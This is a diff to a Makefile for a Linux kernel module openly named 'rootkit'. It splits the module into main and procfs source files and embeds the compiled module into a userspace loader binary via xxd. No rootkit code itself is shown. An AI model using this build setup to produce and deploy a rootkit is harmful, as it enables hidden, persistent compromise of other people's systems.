@@ -1,5 +1,6 @@
-
-obj-m += rootkit.o
+TARGET = rootkit
+rootkit-objs = main.o procfs_utils.o
+obj-m := $(TARGET).o
 
 PWD := $(shell pwd)
 KDIR := /lib/modules/$(shell uname -r)/build
@@ -13,7 +14,7 @@ clean:
 	$(MAKE) -C $(KDIR) M=$(PWD) clean
 
 user: module
-	xxd -i rootkit.ko >> tmp.c
+	xxd -i rootkit.ko > tmp.c
 	cat user.c >> tmp.c
 	gcc tmp.c -o user
 	rm tmp.c
